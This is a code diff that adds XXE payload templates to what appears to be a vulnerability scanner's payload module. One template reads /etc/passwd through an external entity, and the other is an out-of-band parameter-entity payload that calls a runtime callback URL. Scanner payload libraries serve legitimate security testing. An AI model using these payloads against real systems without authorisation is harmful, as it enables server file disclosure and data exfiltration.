@@ -97,3 +97,26 @@ def get_oob_payloads(oob_domain: str) -> list[XxePayload]:
 
 def get_xinclude_payloads() -> list[XxePayload]:
     return XINCLUDE_PAYLOADS
+
+
+# Stage templates — single source for shared/scan/stages/xxe_stages.py
+# Stages import these constants; only token substitution happens at runtime.
+
+STAGE_ERROR_XML = """<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <data>&xxe;</data>
+</root>"""
+
+STAGE_JSON_XML_TEMPLATE = STAGE_ERROR_XML
+
+OOB_PARAM_ENTITY_TEMPLATE = """<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "{callback_url}">
+  %xxe;
+]>
+<root>
+  <data>test</data>
+</root>"""
